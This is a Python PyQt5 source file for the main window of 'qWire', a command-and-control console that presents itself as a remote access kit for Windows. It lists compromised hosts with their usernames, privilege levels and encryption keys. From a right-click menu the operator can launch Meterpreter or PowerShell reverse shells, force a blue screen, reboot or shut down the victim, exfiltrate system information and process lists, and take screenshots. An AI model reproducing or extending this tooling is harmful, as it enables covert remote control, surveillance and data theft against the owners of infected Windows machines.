#          M""MMM""MMM""M oo
#          M  MMM  MMM  M
# .d8888b. M  MMP  MMP  M dP 88d888b. .d8888b.
# 88'  `88 M  MM'  MM' .M 88 88'  `88 88ooood8
# 88.  .88 M  `' . '' .MM 88 88       88.  ...
# `8888P88 M    .d  .dMMM dP dP       `88888P'
#       88 MMMMMMMMMMMMMM    Command and Control
#       dP
# -------------------------------------------------------------
#             [A Remote Access Kit for Windows]
# Author: SlizBinksman
# Github: https://github.com/slizbinksman
# Build:  1.0.1
# -------------------------------------------------------------
from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.Qt import Qt
from PyQt5.QtWidgets import QWidget,QMenu
from PyQt5.QtCore import QEvent

from ..logging.logging import LoggingUtilitys,NetworkingConfigs,ClientWindow,ConsoleWindow
from ..Qt5.settings_window import Ui_settings_window
from ..Qt5.ListenerGUI import Ui_ListenerGUI
from ..Qt5.sysinfo_window import Ui_host_info_window
from ..Qt5.info_window import Ui_information_window
from ..Qt5.screenshot_window import Ui_screenshot_window
from ..Qt5.agent_builder_window import Ui_builder_dialog
from ..Qt5.update_log_window import Ui_update_log_window
from ..Qt5.task_manager_window import Ui_task_manager_dialog
from ..Qt5.icons import IconObj,ImageObj,PixmapObj
from ..utils.file_paths import BGPath
from ..utils.file_paths import DSFilePath
from ..networking.dns_handler import DomainHandler
from ..networking.socket import Utilitys

from ..client_handling.shell import Meterpreter,PowerShell
from ..client_handling.networking import NetHandle
from ..client_handling.enumeration import SystemCommands
from ..client_handling.system import SystemManager
from ..client_handling.surveillance import Streaming

from time import sleep
from os.path import exists

console_output_array = []
listening_ports_array = []
active_connections_array = []
listening_sockets_array = []

BUILD_VERSION = '1.0.1'

#Thread for running background tasks. Qt does not run well with the pythons threading libs
class ProcessRunnable(QtCore.QRunnable):
    def __init__(self, target, args):
        QtCore.QRunnable.__init__(self)
        self.t = target
        self.args = args

    def run(self):
        self.t()

    def start(self):
        QtCore.QThreadPool.globalInstance().start(self)

class Ui_main_window(QWidget):

    #Function will update console window with updates read from file
    def check_for_console_updates(self):
        with open(DSFilePath().console_output_file,'r') as console_output:
            data = console_output.read()
            for output in data.split('\n'):
                if output in console_output_array or output == '': #If the output has already been posted or if its an empty string, dont print it
                    pass
                else:
                    item = QtWidgets.QListWidgetItem(IconObj().sync_icon,output) #add icon to output & make object
                    item.background()
                    self.implant_callback_window.addItem(item)    #add object to window
                    console_output_array.append(output)           #Add item to array so we dont repeat it
                    self.implant_callback_window.scrollToBottom() #Scroll to newly appended item
            console_output.close()

    #Function will update the active_connections_list with current connections only if there is a new connection.
    def update_active_connections(self):
        with open(DSFilePath().active_connections_file,'r') as file:                   #Open the file
            active_conns = file.read()                                  #Store the data in a variable
            file.close()                                                #Close the file
        active_conns_list = active_conns.strip('\n').split('\n')        #Strip all new lines from and split the connections into a list by new lines
        if active_conns_list[0] == '':                                  #If there's no connections, empty string will still count as 1 on len() call
            number_of_conns = 0                                         #Set var to 0
        else:                                                           #else
            number_of_conns = len(active_conns_list)                    #Get the number of connections by the info in the array
        for item in active_connections_array:                           #For each connection in the active_connections_array
            if item not in active_conns_list:                           #If the connection is not in the file written by the socket,
                active_connections_array.remove(item)                   #Remove the connection from the global array
        if number_of_conns == self.active_connections_list.rowCount():            #If the len of conns written by the socket is == the row count of the active connections widget
            pass                                                        #Pass the rest. This will make the row number accessable to the mouse when clicked.
        else:                                                           #If there is a new connection in the file written by the socket, run this code to update the ui
            self.active_connections_list.setRowCount(0)  # Set the row count to 0. This will clear all the items
            if len(active_conns_list) >= 1 and active_conns_list[0] != '':  #If there is 1 or more lines and the line is not an empty array
                self.active_connections_list.setRowCount(number_of_conns)   #Create rows = to the number of connections
            for row in range(number_of_conns):                              #For each connection
                if active_conns_list[row] not in active_connections_array:  #If the conn written by the socket is not in the global array
                    active_connections_array.append(active_conns_list[row]) #Append the connection froms socket file to the global array
                column_count = 0                                            #Set column counter to 0
                for item in active_conns_list[row].split(', '):             #For each piece of info in the respective row
                    data_cell = QtWidgets.QTableWidgetItem()                #Create item object
                    if column_count == 0:                                   #If the item is the first item to be appended
                        try:
                            if active_conns_list[row].split(', ')[7] == "'Administrator'":  #if the privilege level is admin
                                data_cell = QtWidgets.QTableWidgetItem(
                                    IconObj().admin_icon,item.strip("'").strip("[']"))   # Strip quote marks from data in table cells
                            else:                                               # If the connection is not admin
                                data_cell = QtWidgets.QTableWidgetItem(item.strip("'").strip("[']"))  #Create item without icon
                        except IndexError:                                      #Avoid crash if there is nothing to index
                            pass
                    elif column_count != 0:                                     #If its not the first column
                        data_cell = QtWidgets.QTableWidgetItem(item.strip("'").strip("[']"))    #Create item without icon
                    data_cell.setTextAlignment(Qt.AlignCenter)              # Align text in cell to center
                    data_cell.setFlags(Qt.ItemIsEnabled)                    # Make cell read-only otherwise it is editable
                    data_cell.setBackground(Qt.transparent)                 # Make cell background transparent
                    self.active_connections_list.setItem(row, column_count, data_cell)  # add data to respective location
                    column_count += 1                                       #Add one to the column counter

    #Function will start thread to refresh ui
    def start_refresh_ui_thread(self):
        self.ui_refresh_thread = ProcessRunnable(target=self.refresh_ui,args=None)
        self.ui_refresh_thread.start()

    #Function will refresh ui
    def refresh_ui(self):
        while True:
            self.check_for_console_updates()        #Check if there's new posts for the console window
            sleep(.1)                               #sleep
            self.update_active_connections()        #Check if there's updates to the connections window
            sleep(.1)                               #sleep
            self.update_status_window()             #Update the status window

    #Function is wrapper for functions that update things inside the status window
    def update_status_window(self):
        self.update_conn_label()            #Update the connections label
        self.update_current_interface()     #Update the current network interface the server is using
        self.update_data_txrx()             #Update tx/rx label
        self.update_listening_sockets()     #Update listening sockets

    #Function will update the current connections label in the status window panel
    def update_conn_label(self):
        self.connections_label.setText(f"Connections: {self.active_connections_list.rowCount()}")

    #Function will update the current interface label to the current interface
    def update_current_interface(self):
        current_int = NetworkingConfigs().retrieve_network_interface()          #Get the current network interface
        self.interface_label.setText(f"Network Interface: {current_int}")       #Change the text to the interface

    #Function will update data tx/rx label
    def update_data_txrx(self):
        current_data = LoggingUtilitys().retrieve_file_data(DSFilePath().bits_file) #Get the current data in bits file
        if current_data == '':                                                      #If current_data is not int
            current_data = 0                                                        #Set data var to 0
        if int(current_data) < 1000:                                                #If current data is less than 1000 bytes
            self.data_label.setText(f"Data tx/rx: {current_data}\\B")               #Write Bytes to label
        elif int(current_data) >= 1000:                                             #If current data is greater than or == to 1000 Bytes
            current_data = int(current_data)/1000                                   #Divide bytes by 1000
            self.data_label.setText(f"Data tx/rx: {current_data}\\Kb")              #Write Kilobits

    #Function will add listening sockets to the active sockets window
    def update_listening_sockets(self):
        listening_sockets = LoggingUtilitys().retrieve_file_data(DSFilePath().listening_sockets_file).split('\n') #Retrieve list of listening sockets and split into array by newline
        for socket in listening_sockets:                                    #For each socket in the array
            if socket != '\n' and socket not in listening_sockets_array:    #If the socket is not a new line and the socket is not in the already listening sockets array
                item = QtWidgets.QListWidgetItem(socket)                    #init item with socket
                item.setBackground(Qt.transparent)                          #Set the background to transparent
                if socket != '':                                            #If the item is not an empty string
                    self.listening_sockets_list.addItem(item)               #Add the item to the listening sockets list
                    listening_sockets_array.append(socket)                  #Append the socket to the listening sockets array

    #Funtion will update domains to public ip
    def update_dns_domains(self):
        DomainHandler().update_dns_domain()         #Update domain

    #Function is a special function to pass client socket obj and encryption key to window
    def open_client_compatible_window(self,UI,client_sock_obj,encryption_key):
        self.window = QtWidgets.QDialog()
        self.ui = UI()
        self.ui.setupUi(self.window,client_sock_obj,encryption_key)
        self.window.show()

    #Function will open new window with the ui object passed as a parameter
    def open_new_window(self,UI):
        self.window = QtWidgets.QDialog()
        self.ui = UI()
        self.ui.setupUi(self.window)
        self.window.show()

    #Function creates context menu when client is right clicked in the list. Used to interact with client
    def eventFilter(self,source,event):
        #Internal function to get clients encryption key
        def get_key_from_row():
            row = self.active_connections_list.currentRow()                     #Retrieve socket from array based on position in client sock array
            key = self.active_connections_list.item(row,8).text()               #Retrieve encryption key for communication to client
            return key.encode()                                                          #Return key value

        #Internal function to get client socket object
        def get_client_socket_obj():
            row = self.active_connections_list.currentRow()                 #Get the row number
            client_sock_obj = Utilitys().retrieve_socket_from_array(row)    #Retrieve the client socket object
            return client_sock_obj                                          #Return the client socket object

        #Funtion will remove client socket from array
        def remove_client_socket():
            socket_index = self.active_connections_list.currentRow()        #Get the client socket index by the row number
            Utilitys().remove_socket_from_array(socket_index)               #Remove the client socket object from the array with the row number

        if event.type() == QEvent.ContextMenu and source is self.active_connections_list and self.active_connections_list.currentRow() > -1:   #If event is left click and the source is the active connections list
                                                                                                                                               #And there is a connection in the row
            context_menu = QMenu(self)                  #Create Menu Object
            networking_menu = context_menu.addMenu('Networking')        #Create networking submenu
            networking_menu.setIcon(IconObj().net_icon)                           #Add Icon to networking menu
            ping_client = networking_menu.addAction('Ping')             #Add ping action to networking menu
            ping_client.setIcon(IconObj().ping_icon)                              #Ping Icon
            reconnect_action = networking_menu.addAction('Reconnect')   #Add reconnect action
            disconnect_action = networking_menu.addAction('Disconnect') #Add disconnect action
            disconnect_action.setIcon(IconObj().disconnect_icon)        #Add Icon
            reconnect_action.setIcon(IconObj().reconnect_icon)                    #Add icon to reconnect action
            shells_menu = context_menu.addMenu('Shells')                #Create Shells Sub menu
            shells_menu.setIcon(IconObj().shells_icon)                            #Create shells menu icon
            meterpreter_menu = shells_menu.addMenu('Meterpreter')       #Add meterpreter sub menu to shells sub menu
            meterpreter_menu.setIcon(IconObj().msf_icon)                          #Add icon to meterpreter menu
            python_meterpreter = meterpreter_menu.addAction('Python')   #Add python meterpreter action to shells sub menu
            python_meterpreter.setIcon(IconObj().python_icon)                     #Add python icon to python meterpreter
            system_menu = shells_menu.addMenu('System')                 #Add system shells sub menu to sub menu
            system_menu.setIcon(IconObj().system_icon)                               #Add icon to system shells menu
            powershell_shell = system_menu.addAction('PowerShell')      #Add powershell reverse shell to submenu
            powershell_shell.setIcon(IconObj().ps_shell_icon)                     #Add icon to powershell shell option
            sys_manager_menu = context_menu.addMenu('System')           #Add system functions menu
            sys_manager_menu.setIcon(IconObj().system_icon)                          #Add icon to system functions menu
            blue_screen = sys_manager_menu.addAction('BSoD')            #Add blue screen to sys functions menu
            blue_screen.setIcon(IconObj().bsod_icon)                              #Icon
            reboot_client = sys_manager_menu.addAction('Reboot')        #Add reboot client function
            reboot_client.setIcon(IconObj().reconnect_icon)                       #Reuse reconnect icon
            shutdown_client = sys_manager_menu.addAction('Shutdown')    #Shutdown client option
            shutdown_client.setIcon(IconObj().shutdown_icon)                      #Icon
            enumeration_menu = context_menu.addMenu('Enumeration')      #Enumeration menu
            enumeration_menu.setIcon(IconObj().magn_glass_icon)                   #Icon
            system_info = enumeration_menu.addAction('System Info')     #System Information exfiltration
            system_info.setIcon(IconObj().system_icon)                  #Icon
            get_client_process = enumeration_menu.addAction('Task Manager') #Task Manager
            get_client_process.setIcon(IconObj().task_manager_icon)     #Icon
            surveillance_menu = context_menu.addMenu('Surveillance')    #Add surveillance menu
            surveillance_menu.setIcon(IconObj().surveillance_icon)      #Icon
            screenshot = surveillance_menu.addAction('Screenshot')      #Screenshot action
            screenshot.setIcon(IconObj().screenshot_icon)               #Icon

            action = context_menu.exec_(self.mapToGlobal(event.globalPos()))    #Define the click action bool for the menu
            if action == python_meterpreter:                            #If python meterpreter is clicked
                lport = NetworkingConfigs().retrieve_shell_lport()  # Get the listening port
                ConsoleWindow().log_to_console('Starting python meterpreter listener on port {lport}') #Log to console
                Meterpreter().exec_python_meterpreter_shell(lport, get_key_from_row(),get_client_socket_obj())  #Send the shell code to the agent
            if action == powershell_shell:                              #If powershell shell is clicked
                lport = NetworkingConfigs().retrieve_shell_lport()      #Get the listening port
                ConsoleWindow().log_to_console(f'Starting netcat listener on {lport}') #Log to console
                PowerShell().exec_reverse_shell(lport,get_key_from_row(),get_client_socket_obj())   #Send the shell code
            if action == reconnect_action:                              #If the reconnect action is clicked
                ConsoleWindow().log_to_console('Reconnecting client')   #Log action to console
                NetHandle().client_reconnect(get_key_from_row(),get_client_socket_obj())        #Tell the client to reconnect
                ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(), get_key_from_row().decode())
                remove_client_socket()
            if action == ping_client:                                   #If action is ping client
                NetHandle().ping_client(get_key_from_row(),get_client_socket_obj())             #Ping the client and catch the reply
            if action == blue_screen:                                   #If action is to blue screen the client
                ConsoleWindow().log_to_console('Forcing system crash on client') #Log action to console
                SystemManager().force_blue_screen(get_key_from_row(),get_client_socket_obj())   #Force agent to bluescreen computer
                ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(),    #Remove client from screen
                                                        get_key_from_row().decode())
                remove_client_socket()                                                          #Remove the socket
            if action == reboot_client:                                  #If action is to reboot the client
                ConsoleWindow().log_to_console('Rebooting Client')      #Log to console
                SystemManager().reboot_client_system(get_key_from_row(),get_client_socket_obj()) #Force agent to reboot computer
                ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(),#Remove client from screen
                                                        get_key_from_row().decode())
                remove_client_socket()                                                          #Remove client socket
            if action == shutdown_client:                                #If action is to shutdown the client
                ConsoleWindow().log_to_console('Shutting down client computer') #Log to console
                SystemManager().shutdown_client_system(get_key_from_row(),get_client_socket_obj())#Force agent to shutdown the computer
                ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(),#Remove client from screen
                                                        get_key_from_row().decode())
                remove_client_socket()                                                          #Remove the socket
            if action == system_info:
                ConsoleWindow().log_to_console('Retrieving client system information') #Log to console
                SystemCommands().exfil_sys_and_ip_info(get_key_from_row(),get_client_socket_obj()) #Tell agent to run commands, open socket to receive output
                while True:
                    if exists(DSFilePath().sys_info_file):      #When the output is received, a file is made in data_storage. if the file exists
                        break                                   #Break the loop
                ConsoleWindow().log_to_console('Received output from client') #Log to console
                self.open_new_window(Ui_host_info_window)       #Open window with the command output. Window will populate data from file.
            if action == screenshot:
                ConsoleWindow().log_to_console('Capturing screenshot from client') #Log to console
                Streaming().get_client_screenshot(get_key_from_row(),get_client_socket_obj())   #Get screenshot
                self.open_new_window(Ui_screenshot_window)              #Open window with photo
                ConsoleWindow().log_to_console('Received screenshot')   #Log to console
            if action == disconnect_action:                             #If action is to disconnect client
                ConsoleWindow().log_to_console('Disconnecting client')  #Log to console
                NetHandle().disconnect_client(get_key_from_row(),get_client_socket_obj())       #Disconnect the client
                ClientWindow().remove_active_connection(Utilitys().retrieve_client_info_array(),get_key_from_row().decode()) #Remove the connection from the array
                remove_client_socket()                                  #Remove the socket
            if action == get_client_process:                            #If the action is to get the client process
                ConsoleWindow().log_to_console('Starting task manager') #Log to console
                SystemCommands().extract_running_process(get_key_from_row(),get_client_socket_obj()) #Instruct agent to exfiltrate client process's
                while True:                                             #Start while loop
                    if exists(DSFilePath().task_manager_file):          #When the task manager data has arrived
                        sleep(1)                                        #Hold the main thread for 1 second
                        break                                           #Break the loop
                self.open_client_compatible_window(Ui_task_manager_dialog,get_client_socket_obj(),get_key_from_row())   #Open the task manager window
            return True
        return super().eventFilter(source, event)

    def setupUi(self, main_window):
        main_window.setObjectName("main_window")
        main_window.resize(1575, 784)                           #Change main window size
        main_window.setWindowIcon(IconObj().main_window_icon)  #Set main window icon
        main_window.setStyleSheet(f"background-image: url({BGPath().main_window_bg});")
        self.centralwidget = QtWidgets.QWidget(main_window)
        self.centralwidget.setObjectName("centralwidget")
        self.active_connections_list = QtWidgets.QTableWidget(self.centralwidget)
        self.active_connections_list.setGeometry(QtCore.QRect(0, 0, 1575, 351))
        self.active_connections_list.setSizePolicy(QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Expanding)
        self.active_connections_list.setAutoFillBackground(True)
        self.active_connections_list.setObjectName("active_connections_list")
        self.active_connections_list.horizontalHeader().setStretchLastSection(True)
        self.active_connections_list.verticalHeader().setVisible(False)         #Hide The row numbers from the connections list
        self.active_connections_list.setColumnCount(9)
        self.active_connections_list.setRowCount(0)
        item = QtWidgets.QTableWidgetItem()
        self.active_connections_list.setHorizontalHeaderItem(0, item)
        item = QtWidgets.QTableWidgetItem()
        self.active_connections_list.setHorizontalHeaderItem(1, item)
        item = QtWidgets.QTableWidgetItem()
        self.active_connections_list.setHorizontalHeaderItem(2, item)
        item = QtWidgets.QTableWidgetItem()
        self.active_connections_list.setHorizontalHeaderItem(3, item)
        item = QtWidgets.QTableWidgetItem()
        self.active_connections_list.setHorizontalHeaderItem(4, item)
        item = QtWidgets.QTableWidgetItem()
        self.active_connections_list.setHorizontalHeaderItem(5, item)
        item = QtWidgets.QTableWidgetItem()
        self.active_connections_list.setHorizontalHeaderItem(6, item)
        item = QtWidgets.QTableWidgetItem()
        self.active_connections_list.setHorizontalHeaderItem(7, item)
        item = QtWidgets.QTableWidgetItem()
        self.active_connections_list.setHorizontalHeaderItem(8, item)
        for i in range(8):
            self.active_connections_list.setColumnWidth(int(i), 174)
        self.active_connections_list.setColumnWidth(8,181)
        self.active_connections_list.installEventFilter(self)
        self.implant_callback_window = QtWidgets.QListWidget(self.centralwidget)
        self.implant_callback_window.setGeometry(QtCore.QRect(1030, 390, 551, 251))
        self.implant_callback_window.setStyleSheet("")
        self.implant_callback_window.setObjectName("implant_callback_window")
        ##############################
        # Left hidden sync button in there for now as it is not causing any issues and makes the program work as intended
        ##############################
        self.sync_button = QtWidgets.QPushButton(self.centralwidget, clicked=lambda: self.start_refresh_ui_thread())
        self.sync_button.setGeometry(QtCore.QRect(10, 620, 141, 31))
        self.sync_button.setObjectName("pushButton_2")
        ######################################################
        # Begin Menu Bar section for top of main gui         #
        ######################################################
        self.main_menu_bar = QtWidgets.QMenuBar(main_window)
        self.main_menu_bar.setGeometry(QtCore.QRect(0, 0, 1575, 24))
        self.main_menu_bar.setObjectName("main_menu_bar")
        self.network_menu = QtWidgets.QMenu(self.main_menu_bar)
        self.network_menu.setObjectName('network_menu')
        self.network_menu.setIcon(IconObj().net_icon)
        self.about_menu = QtWidgets.QMenu(self.main_menu_bar)
        self.about_menu.setObjectName('about_menu')
        self.about_menu.setIcon(IconObj().info_icon)
        self.builder_menu = QtWidgets.QMenu(self.main_menu_bar)
        self.builder_menu.setObjectName("builder_menu")
        self.builder_menu.setIcon(IconObj().builder_icon)
        self.settings_menu = QtWidgets.QMenu(self.main_menu_bar)
        self.settings_menu.setObjectName("settings_menu")
        self.settings_menu.setIcon(IconObj().settings_icon)
        main_window.setMenuBar(self.main_menu_bar)
        self.open_listener_window = QtWidgets.QAction(main_window,triggered=lambda: self.open_new_window(Ui_ListenerGUI))
        self.open_listener_window.setObjectName("open_listener_window")
        self.open_listener_window.setIcon(IconObj().satellite_icon)
        self.update_dns = QtWidgets.QAction(main_window,triggered=lambda: self.update_dns_domains())
        self.update_dns.setObjectName("update_dns")
        self.update_dns.setIcon(IconObj().duck_dns_icon)
        self.version_info = QtWidgets.QAction(main_window,triggered=lambda: self.open_new_window(Ui_information_window))
        self.version_info.setObjectName("version_info")
        self.version_info.setIcon(IconObj().info_icon)
        self.update_logs = QtWidgets.QAction(main_window,triggered=lambda: self.open_new_window(Ui_update_log_window))
        self.update_logs.setObjectName("update_logs")
        self.update_logs.setIcon(IconObj().update_log_icon)
        self.agent_builder = QtWidgets.QAction(main_window,triggered=lambda: self.open_new_window(Ui_builder_dialog))
        self.agent_builder.setObjectName("agent_builder")
        self.agent_builder.setIcon(IconObj().builder_icon)
        self.qwire_settings = QtWidgets.QAction(main_window,triggered=lambda: self.open_new_window(Ui_settings_window))
        self.qwire_settings.setObjectName("qwire_settings")
        self.qwire_settings.setIcon(IconObj().settings_icon)
        self.network_menu.addAction(self.open_listener_window)
        self.network_menu.addAction(self.update_dns)
        self.about_menu.addAction(self.version_info)
        self.about_menu.addAction(self.update_logs)
        self.builder_menu.addAction(self.agent_builder)
        self.settings_menu.addAction(self.qwire_settings)
        self.main_menu_bar.addAction(self.network_menu.menuAction())
        self.main_menu_bar.addAction(self.builder_menu.menuAction())
        self.main_menu_bar.addAction(self.settings_menu.menuAction())
        self.main_menu_bar.addAction(self.about_menu.menuAction())
        #########################################################
        #                END MENU BAR                           #
        #########################################################
        self.status_window = QtWidgets.QLabel(self.centralwidget)
        self.status_window.setGeometry(QtCore.QRect(20, 370, 731, 221))
        self.status_window.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
        self.status_window.setObjectName("status_window")
        self.connections_label = QtWidgets.QLabel(self.centralwidget)
        self.connections_label.setGeometry(QtCore.QRect(60, 500, 171, 19))
        self.connections_label.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
        self.connections_label.setObjectName("connections_label")
        self.conns_label_icon = QtWidgets.QLabel(self.centralwidget)
        self.conns_label_icon.setGeometry(QtCore.QRect(30, 500, 21, 20))
        self.conns_label_icon.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
        self.conns_label_icon.setText("")
        self.conns_label_icon.setPixmap(PixmapObj().net_pixmap)
        self.conns_label_icon.setScaledContents(True)
        self.conns_label_icon.setObjectName("conns_label_icon")
        self.data_label = QtWidgets.QLabel(self.centralwidget)
        self.data_label.setGeometry(QtCore.QRect(60, 530, 181, 19))
        self.data_label.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
        self.data_label.setObjectName("data_label")
        self.data_label_icon = QtWidgets.QLabel(self.centralwidget)
        self.data_label_icon.setGeometry(QtCore.QRect(30, 530, 21, 20))
        self.data_label_icon.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
        self.data_label_icon.setText("")
        self.data_label_icon.setPixmap(PixmapObj().socket_pixmap)
        self.data_label_icon.setScaledContents(True)
        self.data_label_icon.setObjectName("data_label_icon")
        self.interface_label = QtWidgets.QLabel(self.centralwidget)
        self.interface_label.setGeometry(QtCore.QRect(60, 560, 181, 19))
        self.interface_label.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
        self.interface_label.setObjectName("interface_label")
        self.nic_label_icon = QtWidgets.QLabel(self.centralwidget)
        self.nic_label_icon.setGeometry(QtCore.QRect(30, 560, 21, 20))
        self.nic_label_icon.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
        self.nic_label_icon.setPixmap(PixmapObj().nic_pixmap)
        self.nic_label_icon.setScaledContents(True)
        self.nic_label_icon.setObjectName("nic_label_icon")
        self.active_sockets_label = QtWidgets.QLabel(self.centralwidget)
        self.active_sockets_label.setGeometry(QtCore.QRect(255,480,150,20))
        self.active_sockets_label.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
        self.active_sockets_label.setText("Active Sockets")
        self.active_sockets_label_icon =QtWidgets.QLabel(self.centralwidget)
        self.active_sockets_label_icon.setGeometry(QtCore.QRect(230,480,20,20))
        self.active_sockets_label_icon.setStyleSheet(f"background-image: url({ImageObj().grey_box});")
        self.active_sockets_label_icon.setPixmap(PixmapObj().listener_pixmap)
        self.active_sockets_label_icon.setScaledContents(True)
        self.listening_sockets_list = QtWidgets.QListWidget(self.centralwidget)
        self.listening_sockets_list.setGeometry(QtCore.QRect(250, 510,101,70))
        self.gwa_ascii_label = QtWidgets.QLabel(self.centralwidget)
        self.gwa_ascii_label.setGeometry(QtCore.QRect(20, 360, 370, 140))
        self.gwa_ascii_label.setStyleSheet(f"background-image: url({ImageObj().gwa_ascii_art});")
        self.gwa_ascii_label.setObjectName("gwa_ascii_label")
        self.ascii_globe_label = QtWidgets.QLabel(self.centralwidget)
        self.ascii_globe_label.setGeometry(385, 380, 355, 201)
        self.ascii_globe_label.setObjectName("ascii_globe_label")
        self.ascii_globe_label.setScaledContents(True)
        self.spinning_globe = QtGui.QMovie(ImageObj().spinning_globe_gif)
        self.ascii_globe_label.setMovie(self.spinning_globe)
        self.spinning_globe.start()
        main_window.setCentralWidget(self.centralwidget)
        self.retranslateUi(main_window)

        QtCore.QMetaObject.connectSlotsByName(main_window)


    def retranslateUi(self, main_window):
        _translate = QtCore.QCoreApplication.translate
        main_window.setWindowTitle(_translate("main_window", f"qWire CnC Build: {BUILD_VERSION}"))
        item = self.active_connections_list.horizontalHeaderItem(0)
        item.setText(_translate("main_window", "Public IP:Port"))
        item = self.active_connections_list.horizontalHeaderItem(1)
        item.setText(_translate("main_window", "Local IP"))
        item = self.active_connections_list.horizontalHeaderItem(2)
        item.setText(_translate("main_window", "Location"))
        item = self.active_connections_list.horizontalHeaderItem(3)
        item.setText(_translate("main_window", "System Name"))
        item = self.active_connections_list.horizontalHeaderItem(4)
        item.setText(_translate("main_window", "Operating System"))
        item = self.active_connections_list.horizontalHeaderItem(5)
        item.setText(_translate("main_window", "OS Version"))
        item = self.active_connections_list.horizontalHeaderItem(6)
        item.setText(_translate("main_window", "Username"))
        item = self.active_connections_list.horizontalHeaderItem(7)
        item.setText(_translate("main_window", "Privelege"))
        item = self.active_connections_list.horizontalHeaderItem(8)
        item.setText(_translate("main_window", "Encryption Key"))
        self.open_listener_window.setText(_translate("main_window", "Listenters"))
        self.update_dns.setText(_translate("main_window", "Update DNS"))
        self.version_info.setText(_translate("main_window", "Version Info"))
        self.update_logs.setText(_translate("main_window", "Update Log"))
        self.agent_builder.setText(_translate("main_window", "Agent Builder"))
        self.qwire_settings.setText(_translate("main_window", "qWire Settings"))
        self.connections_label.setText(_translate("main_window", "Connections: 0"))
        self.data_label.setText(_translate("main_window", "Data tx/rx: 0\\b"))
        self.interface_label.setText(_translate("main_window", "Network Interface: "))
        self.active_sockets_label.setText(_translate("main_window", "Active Sockets"))
        self.sync_button.click() #Automatically start ui refresh thread at program launch
        self.sync_button.hide()  #Hide the sync button